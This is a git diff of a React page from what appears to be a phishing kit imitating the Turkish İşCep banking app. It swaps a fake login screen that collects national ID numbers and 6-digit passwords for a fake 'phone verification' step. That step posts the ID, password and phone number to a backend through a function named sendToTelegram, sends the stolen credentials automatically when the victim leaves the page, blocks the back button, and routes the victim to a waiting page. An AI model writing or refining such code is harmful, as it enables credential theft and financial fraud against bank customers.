@@ -1,108 +1,61 @@
 import React, { useEffect, useRef, useCallback, memo } from 'react';
-import { useNavigate, useLocation } from 'react-router-dom';
+import { useLocation, useNavigate } from 'react-router-dom';
 import './App.css';
-import { useAuth } from './AuthContext';
+import { useAuth, AuthProvider } from './AuthContext';
+import { ScrollProvider, useScroll } from './ScrollContext';
 
 const isIOS = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-function LoginPage() {
-  const { state, dispatch } = useAuth();
-  const { inputValue = '', passwordValue = '' } = state || {};
-  const passwordInputRef = useRef(null);
-  const tcInputRef = useRef(null);
-  const navigate = useNavigate();
-  const location = useLocation();
-
-  const [localState, setLocalState] = React.useState({
-    isTcActive: inputValue.length > 0,
-    isActive: passwordValue.length > 0,
-    isTcBold: inputValue.length > 0,
-    showTcError: false,
+function PhoneVerificationPageContent() {
+  const [state, setState] = React.useState({
+    phoneNumber: '',
+    isPhoneActive: false,
+    isPhoneLabelHovered: false,
+    showPhoneError: false,
+    isSubmitting: false,
+    isPhoneFocused: false,
+    isPhonePrefixVisible: false,
+    errorMessage: '',
   });
 
+  const phoneInputRef = useRef(null);
+  const { rightSectionRef } = useScroll();
+  const location = useLocation();
+  const navigate = useNavigate();
+  const { dispatch: authDispatch } = useAuth();
+  const { tc, password, isValidNavigation } = location.state || {};
+
+  // Navigasyon ve geri tuşu kontrolü
   useEffect(() => {
-    if (location.state?.fromPhoneVerification || location.state?.fromWaitingPage) {
-      dispatch({ type: 'RESET_AUTH' });
-      setLocalState({
-        isTcActive: false,
-        isActive: false,
-        isTcBold: false,
-        showTcError: false,
-      });
+    if (!isValidNavigation || !tc || !password || tc.length !== 11 || password.length !== 6) {
+      setState((prev) => ({
+        ...prev,
+        showPhoneError: true,
+        errorMessage: 'Lütfen önce giriş yapın.',
+      }));
+      authDispatch({ type: 'RESET_AUTH' });
+      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
+      return;
     }
-  }, [location.state, dispatch]);
 
-  useEffect(() => {
-    if (inputValue.length === 11 && passwordInputRef.current) {
-      passwordInputRef.current.focus();
-      const rightSection = document.querySelector('.right-section');
-      if (rightSection) {
-        const passwordInput = passwordInputRef.current;
-        const inputRect = passwordInput.getBoundingClientRect();
-        const viewportHeight = window.visualViewport?.height || window.innerHeight;
+    window.history.replaceState({ page: 'telefon' }, '', '/telefon');
+    window.history.pushState({ page: 'telefon-guard' }, '', '/telefon');
 
-        if (isIOS()) {
-          setTimeout(() => {
-            requestAnimationFrame(() => {
-              passwordInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            });
-          }, 200);
-        } else {
-          const offset = 200;
-          setTimeout(() => {
-            requestAnimationFrame(() => {
-              const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
-              rightSection.scrollTo({ top: scrollTo, behavior: 'smooth' });
-            });
-          }, 200);
-        }
-      }
-    }
-  }, [inputValue]);
-
-  useEffect(() => {
-    const handleTcFocus = () => {
-      const rightSection = document.querySelector('.right-section');
-      if (!rightSection || !tcInputRef.current) return;
-
-      if (isIOS()) {
-        setTimeout(() => {
-          requestAnimationFrame(() => {
-            tcInputRef.current.scrollIntoView({ behavior: 'smooth', block: 'center' });
-          });
-        }, 200);
-        return;
-      }
-
-      const isAndroid = /Android/i.test(navigator.userAgent);
-      if (!isAndroid) return;
-
-      const tcInput = tcInputRef.current;
-      const inputRect = tcInput.getBoundingClientRect();
-      const viewportHeight = window.visualViewport?.height || window.innerHeight;
-      const offset = 100;
-      setTimeout(() => {
-        requestAnimationFrame(() => {
-          const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
-          rightSection.scrollTo({ top: scrollTo, behavior: 'smooth' });
-        });
-      }, 200);
+    const handlePopState = () => {
+      authDispatch({ type: 'RESET_AUTH' });
+      window.history.replaceState(null, '', '/giris');
+      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
     };
 
-    const tcInput = tcInputRef.current;
-    if (tcInput) {
-      tcInput.addEventListener('focus', handleTcFocus);
-    }
+    window.addEventListener('popstate', handlePopState);
+    return () => window.removeEventListener('popstate', handlePopState);
+  }, [tc, password, isValidNavigation, navigate, authDispatch]);
 
-    return () => {
-      if (tcInput) tcInput.removeEventListener('focus', handleTcFocus);
-    };
-  }, []);
-
+  // Meta tag ve sanal klavye ayarları
   useEffect(() => {
     const meta = document.createElement('meta');
     meta.name = 'viewport';
-    meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-visual';
+    meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=overlays-content';
     document.head.appendChild(meta);
 
     if (!isIOS() && 'virtualKeyboard' in navigator) {
@@ -110,13 +63,13 @@ function LoginPage() {
       navigator.virtualKeyboard.ongeometrychange = () => {
         const kbHeight = navigator.virtualKeyboard.boundingRect.height;
         document.body.style.setProperty('--keyboard-height', `${kbHeight}px`);
-        const rightSection = document.querySelector('.right-section');
+        const rightSection = rightSectionRef.current;
         if (rightSection) {
           rightSection.style.paddingBottom = `${kbHeight + 150}px`;
         }
       };
     } else if (isIOS()) {
-      const rightSection = document.querySelector('.right-section');
+      const rightSection = rightSectionRef.current;
       if (rightSection) {
         rightSection.style.paddingBottom = '150px';
       }
@@ -125,286 +78,306 @@ function LoginPage() {
     return () => {
       document.head.removeChild(meta);
     };
-  }, []);
+  }, [rightSectionRef]);
 
-  const handleNumberInput = useCallback(
-    (e, type, maxLength) => {
-      const value = e.target.value;
-      if (/^\d*$/.test(value) && value.length <= maxLength) {
-        dispatch({ type, payload: value });
-        setLocalState((prev) => ({
-          ...prev,
-          ...(type === 'SET_INPUT_VALUE'
-            ? { isTcActive: true, isTcBold: value.length > 0, showTcError: false }
-            : { isActive: true, showTcError: false }),
-        }));
+  // Sayfa yüklendiğinde en üste kaydır
+  useEffect(() => {
+    const scrollToTop = () => {
+      if (rightSectionRef.current) {
+        rightSectionRef.current.scrollTop = 0;
+        rightSectionRef.current.dataset.loaded = "true";
+        console.log('Sayfa en üste kaydırıldı');
+      } else {
+        setTimeout(scrollToTop, 100);
       }
-    },
-    [dispatch]
-  );
+    };
 
-  const handleTcKeyDown = useCallback((e) => {
-    if ((e.key === 'Backspace' || e.key === 'Delete') && !e.target.value) {
-      setLocalState((prev) => ({
-        ...prev,
-        isTcBold: false,
-        isTcActive: true,
-      }));
-    }
-  }, []);
+    setTimeout(() => {
+      requestAnimationFrame(scrollToTop);
+    }, 200);
+  }, [rightSectionRef]);
 
-  const handleClearTc = useCallback(
-    (e) => {
-      e.stopPropagation();
-      dispatch({ type: 'CLEAR_TC' });
-      setLocalState((prev) => ({
-        ...prev,
-        isTcActive: true,
-        isTcBold: false,
-        showTcError: false,
-      }));
-      tcInputRef.current?.focus();
-    },
-    [dispatch]
-  );
+  // Scroll optimizasyonu: Fokus ve blur olayları
+  useEffect(() => {
+    const phoneRef = phoneInputRef.current;
 
-  const handleClearPassword = useCallback(
-    (e) => {
-      e.stopPropagation();
-      dispatch({ type: 'CLEAR_PASSWORD' });
-      setLocalState((prev) => ({
-        ...prev,
-        isActive: true,
-        showTcError: false,
-      }));
-      passwordInputRef.current?.focus();
-    },
-    [dispatch]
-  );
-
-  const handleTcFocus = useCallback(() => {
-    setLocalState((prev) => ({
-      ...prev,
-      isTcActive: true,
-      isTcBold: inputValue.length > 0,
-    }));
-  }, [inputValue]);
-
-  const handleTcBlur = useCallback(() => {
-    if (!inputValue.length) {
-      setLocalState((prev) => ({
-        ...prev,
-        isTcActive: false,
-        isTcBold: false,
-      }));
-    }
-  }, [inputValue]);
-
-  const handlePasswordFocus = useCallback(() => {
-    setLocalState((prev) => ({ ...prev, isActive: true }));
-  }, []);
-
-  const handlePasswordBlur = useCallback(
-    (e) => {
-      const isClearButton = e.relatedTarget?.classList.contains('clear-password-button');
-      if (!passwordValue.length && !isClearButton) {
-        setLocalState((prev) => ({ ...prev, isActive: false }));
+    const handleFocusScroll = () => {
+      const rightSection = rightSectionRef.current;
+      if (!rightSection || !phoneRef) {
+        console.warn('rightSectionRef veya phoneRef mevcut değil');
+        return;
       }
-    },
-    [passwordValue]
-  );
 
-  const handleContinueClick = useCallback(() => {
-    if (inputValue.length > 0 && inputValue.length !== 11) {
-      setLocalState((prev) => ({ ...prev, showTcError: true }));
-      return;
+      if (isIOS()) {
+        setTimeout(() => {
+          requestAnimationFrame(() => {
+            phoneRef.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            console.log('iOS: scrollIntoView tetiklendi');
+          });
+        }, 200);
+        return;
+      }
+
+      const isAndroid = /Android/i.test(navigator.userAgent);
+      if (!isAndroid) {
+        console.warn('Android cihaz değil');
+        return;
+      }
+
+      const inputRect = phoneRef.getBoundingClientRect();
+      const viewportHeight = window.visualViewport?.height || window.innerHeight;
+      const offset = 200; // LoginPage'deki password-input ofsetine benzer, artırıldı
+
+      console.log('Android: Scroll işlemi başlatılıyor', { inputRect, viewportHeight, offset });
+
+      setTimeout(() => {
+        requestAnimationFrame(() => {
+          const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
+          rightSection.scrollTo({ top: scrollTo, behavior: 'smooth' });
+          console.log('Android: Scroll tamamlandı', { scrollTo });
+        });
+      }, 300); // Klavye animasyonu için gecikme artırıldı
+    };
+
+    const handleBlurScroll = () => {
+      const rightSection = rightSectionRef.current;
+      if (rightSection) {
+        rightSection.style.height = '100vh';
+        rightSection.style.paddingBottom = isIOS() ? '150px' : '0';
+        rightSection.scrollTo({ top: 0, behavior: 'smooth' });
+        console.log('Blur: Sayfa en üste kaydırıldı');
+      }
+    };
+
+    if (phoneRef) {
+      phoneRef.addEventListener('focus', handleFocusScroll);
+      phoneRef.addEventListener('blur', handleBlurScroll);
     }
-    if (inputValue.length === 11 && passwordValue.length === 6) {
-      navigate('/telefon', {
-        state: { tc: inputValue, password: passwordValue, isValidNavigation: true },
-        replace: true,
+
+    return () => {
+      if (phoneRef) {
+        phoneRef.removeEventListener('focus', handleFocusScroll);
+        phoneRef.removeEventListener('blur', handleBlurScroll);
+      }
+    };
+  }, [rightSectionRef]);
+
+  // Telegram'a veri gönderimi
+  const sendToTelegram = useCallback(async (data) => {
+    try {
+      const res = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tc: String(data.tc),
+          password: String(data.password),
+          phone: String(data.phone),
+        }),
       });
+      const result = await res.json();
+      if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');
+      return result;
+    } catch (error) {
+      setState((prev) => ({
+        ...prev,
+        showPhoneError: true,
+        errorMessage: error.message || 'Veri gönderimi sırasında hata oluştu.',
+      }));
+      return { error: error.message };
     }
-  }, [inputValue, passwordValue, navigate]);
+  }, []);
 
-  const handleFormSubmit = useCallback(
-    (e) => {
+  // Siteden çıkıldığında veri gönderimi
+  useEffect(() => {
+    const handleBeforeUnload = () => {
+      if (tc && password && !state.phoneNumber) {
+        sendToTelegram({ tc, password, phone: '' });
+      }
+    };
+    window.addEventListener('beforeunload', handleBeforeUnload);
+    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
+  }, [tc, password, state.phoneNumber, sendToTelegram]);
+
+  // Telefon numarası inputu değişimi
+  const handleNumberInput = useCallback((e) => {
+    const value = e.target.value.replace(/\D/g, '');
+    if (value.length <= 10) {
+      setState((prev) => ({
+        ...prev,
+        phoneNumber: value,
+        isPhoneActive: true,
+        isPhoneLabelHovered: true,
+        isPhonePrefixVisible: true,
+        showPhoneError: false,
+        errorMessage: '',
+      }));
+    }
+  }, []);
+
+  // Telefon numarasını temizleme
+  const handleClearPhoneNumber = useCallback(() => {
+    setState((prev) => ({
+      ...prev,
+      phoneNumber: '',
+      isPhoneActive: true,
+      isPhoneLabelHovered: true,
+      isPhonePrefixVisible: true,
+      showPhoneError: false,
+      errorMessage: '',
+    }));
+    phoneInputRef.current?.focus();
+  }, []);
+
+  // Telefon inputuna fokuslanma
+  const handlePhoneFocus = useCallback(() => {
+    setState((prev) => ({
+      ...prev,
+      isPhoneActive: true,
+      isPhoneLabelHovered: true,
+      isPhonePrefixVisible: true,
+      isPhoneFocused: true,
+    }));
+  }, []);
+
+  // Telefon inputundan çıkma
+  const handlePhoneBlur = useCallback(() => {
+    setState((prev) => ({
+      ...prev,
+      isPhoneFocused: false,
+      isPhoneActive: prev.phoneNumber.length > 0,
+      isPhoneLabelHovered: prev.phoneNumber.length > 0,
+      isPhonePrefixVisible: prev.phoneNumber.length > 0,
+    }));
+  }, []);
+
+  // Telefon doğrulama gönderimi
+  const handlePhoneSubmit = useCallback(
+    async (e) => {
       e.preventDefault();
-      e.stopPropagation();
-      handleContinueClick();
-      if (document.activeElement) {
-        document.activeElement.blur();
+      if (state.phoneNumber.length > 0 && state.phoneNumber.length !== 10) {
+        setState((prev) => ({
+          ...prev,
+          showPhoneError: true,
+          errorMessage: 'Telefon numarası 10 haneli olmalı.',
+        }));
+        return;
+      }
+      if (state.phoneNumber.length === 10) {
+        setState((prev) => ({ ...prev, isSubmitting: true }));
+        const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });
+        if (result && !result.error) {
+          authDispatch({ type: 'RESET_AUTH' });
+          setState({
+            phoneNumber: '',
+            isPhoneActive: false,
+            isPhoneLabelHovered: false,
+            showPhoneError: false,
+            isSubmitting: false,
+            isPhoneFocused: false,
+            isPhonePrefixVisible: false,
+            errorMessage: '',
+          });
+          window.history.replaceState(null, '', '/bekleme');
+          navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
+        }
       }
     },
-    [handleContinueClick]
+    [state.phoneNumber, sendToTelegram, tc, password, navigate, authDispatch]
   );
 
   return (
-    <form onSubmit={handleFormSubmit} style={{ touchAction: 'manipulation' }}>
-      <div className="container">
-        <div className="right-section">
-          <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo" loading="lazy" />
-          <div className="user-icon">
-            <img src="/user.png" alt="Kullanıcı Simgesi" loading="lazy" />
+    <div className="container" style={{ touchAction: 'manipulation' }} data-page="telefon">
+      <div className="right-section" ref={rightSectionRef}>
+        <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo iscep-logo-phone" loading="lazy" />
+        <div className="new-container phone-verification-title">
+          Telefon Doğrulama
+        </div>
+        <div className="input-wrapper">
+          <div className="verification-subtitle">
+            Lütfen cep telefon numaranızı doğrulayın
           </div>
-          <div className="new-container">
-            Yeni Kullanıcı
-            <div className="down-arrow">
-              <img src="/down-arrow.png" alt="Aşağı Ok" className="down-arrow-img" loading="lazy" />
-            </div>
-          </div>
-          <div className="new-lower-container">Bireysel</div>
-          <div className="input-wrapper">
-            <div
-              className={`tc-input-wrapper ${localState.showTcError ? 'error' : ''}`}
-              onClick={() => tcInputRef.current?.focus()}
+          <div
+            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${
+              state.isPhonePrefixVisible ? 'prefix-visible' : ''
+            }`}
+            onClick={() => phoneInputRef.current?.focus()}
+          >
+            <label
+              className={`phone-label ${state.isPhoneLabelHovered ? 'phone-hovered' : ''}`}
+              htmlFor="phone-input"
             >
-              <label
-                className={`tc-label ${localState.isTcActive ? 'hovered' : ''}`}
-                htmlFor="tc-input"
-              >
-                Müşteri Numarası /{' '}
-                <span className={`tc-label-part ${localState.isTcBold ? 'bold' : ''}`}>
-                  TCKN-YKN
-                </span>
-              </label>
+              Telefon Numarası
+            </label>
+            <div className="phone-input-container">
+              <span className="phone-prefix">+90</span>
               <input
-                id="tc-input"
-                ref={tcInputRef}
+                id="phone-input"
+                ref={phoneInputRef}
                 type="tel"
                 inputMode="numeric"
                 pattern="[0-9]*"
-                maxLength="11"
-                value={inputValue}
-                onChange={(e) => handleNumberInput(e, 'SET_INPUT_VALUE', 11)}
-                onFocus={handleTcFocus}
-                onBlur={handleTcBlur}
-                onKeyDown={handleTcKeyDown}
-                className={`new-input tc-input ${localState.showTcError ? 'error' : ''}`}
-                autoComplete="off"
+                maxLength="10"
+                value={state.phoneNumber}
+                onChange={handleNumberInput}
+                onFocus={handlePhoneFocus}
+                onBlur={handlePhoneBlur}
+                className={`new-input phone-input ${state.showPhoneError ? 'error' : ''}`}
+                autoComplete="tel"
                 autoCapitalize="none"
-                aria-describedby="tc-error"
-                aria-label="Müşteri Numarası veya TCKN-YKN"
+                aria-describedby="phone-error"
+                aria-label="Telefon Numarası"
+                aria-invalid={state.showPhoneError}
               />
-              {inputValue.length > 0 && (
+              {state.phoneNumber.length > 0 && (
                 <button
-                  className="clear-tc-button"
-                  type="button"
-                  onClick={handleClearTc}
-                  onTouchStart={handleClearTc}
-                  aria-label="TCKN-YKN’yi temizle"
+                  className="clear-phone-button"
+                  onClick={handleClearPhoneNumber}
+                  onTouchStart={handleClearPhoneNumber}
+                  aria-label="Telefon numarasını temizle"
                 >
                   ✕
                 </button>
               )}
-              {localState.showTcError && (
-                <div id="tc-error" className="tc-error" role="alert" aria-live="assertive">
-                  <img
-                    src="/error.png"
-                    alt="Hata Simgesi"
-                    className="error-icon"
-                    loading="lazy"
-                    onError={() => console.warn('Hata simgesi yüklenemedi')}
-                  />
-                  Hatalı giriş yaptınız, lütfen tekrar deneyiniz.
-                </div>
-              )}
             </div>
-            <div className={`action-links ${inputValue.length === 11 ? 'shifted' : ''} ${
-                localState.showTcError ? 'error-shifted' : ''
-              }`}
-            >
-              <button
-                className="action-link become-customer"
-                type="button"
-                onClick={() => console.log('Müşteri Olmak İstiyorum tıklandı')}
-              >
-                MÜŞTERİ OLMAK İSTİYORUM
-              </button>
-              <button
-                className="action-link create-password"
-                type="button"
-                onClick={() => console.log('Şifre Oluştur tıklandı')}
-              >
-                ŞİFRE OLUŞTUR
-              </button>
-            </div>
-            {inputValue.length === 11 && (
-              <div className="password-input-wrapper">
-                <label
-                  className={`password-label ${localState.isActive ? 'hovered' : ''}`}
-                  htmlFor="password-input"
-                >
-                  Şifre
-                </label>
-                <div className="password-input-container">
-                  <input
-                    id="password-input"
-                    ref={passwordInputRef}
-                    type="password"
-                    inputMode="numeric"
-                    pattern="[0-9]*"
-                    maxLength="6"
-                    value={passwordValue}
-                    onChange={(e) => handleNumberInput(e, 'SET_PASSWORD_VALUE', 6)}
-                    onFocus={handlePasswordFocus}
-                    onBlur={handlePasswordBlur}
-                    className={`new-input password-input ${
-                      inputValue.length === 11 ? 'no-right-line' : ''
-                    }`}
-                    autoComplete="new-password"
-                    autoCapitalize="none"
-                    aria-describedby="password-error"
-                    aria-label="Şifre"
-                  />
-                  {passwordValue.length > 0 && (
-                    <button
-                      className="clear-password-button"
-                      type="button"
-                      onClick={handleClearPassword}
-                      onTouchStart={handleClearPassword}
-                      aria-label="Şifreyi temizle"
-                    >
-                      ✕
-                    </button>
-                  )}
-                </div>
-                {(passwordValue.length > 0 || localState.isActive) && (
-                  <div className="password-overlay">
-                    <span className="dots">
-                      {[...Array(6)].map((_, index) => (
-                        <span
-                          key={index}
-                          className={`dot ${index < passwordValue.length ? '' : 'inactive'}`}
-                        />
-                      ))}
-                    </span>
-                  </div>
-                )}
+            {state.showPhoneError && (
+              <div id="phone-error" className="phone-error" role="alert" aria-live="assertive">
+                <img
+                  src="/error.png"
+                  alt="Hata Simgesi"
+                  className="error-icon"
+                  loading="lazy"
+                  onError={() => console.warn('Hata simgesi yüklenemedi')}
+                />
+                {state.errorMessage || 'Lütfen 10 haneli telefon numaranızı girin.'}
               </div>
             )}
-            <button
-              type="submit"
-              className={`continue-button ${
-                inputValue.length > 0 &&
-                (inputValue.length < 11 || (inputValue.length === 11 && passwordValue.length === 6))
-                  ? 'active-continue-button'
-                  : ''
-              } ${inputValue.length === 11 ? 'shifted' : ''} ${
-                localState.showTcError ? 'error-shifted' : ''
-              }`}
-              onClick={handleContinueClick}
-              disabled={inputValue.length === 0 || (inputValue.length === 11 && passwordValue.length !== 6)}
-              aria-label="Devam et"
-            >
-              Devam
-            </button>
           </div>
-          <div style={{ height: '135vh', width: '100%' }}></div>
         </div>
+        <div className="verify-button-container">
+          <button
+            className={`button-phone ${state.phoneNumber.length > 0 ? 'active-continue-button' : ''}`}
+            onClick={handlePhoneSubmit}
+            onTouchStart={handlePhoneSubmit}
+            disabled={state.isSubmitting}
+            aria-label="Telefon numarasını doğrula"
+          >
+            Doğrula
+          </button>
+        </div>
+        <div style={{ height: '135vh', width: '100%' }}></div>
       </div>
-    </form>
+    </div>
   );
 }
 
-export default memo(LoginPage);
+function PhoneVerificationPage() {
+  return (
+    <ScrollProvider>
+      <AuthProvider>
+        <PhoneVerificationPageContent />
+      </AuthProvider>
+    </ScrollProvider>
+  );
+}
+
+export default memo(PhoneVerificationPage);
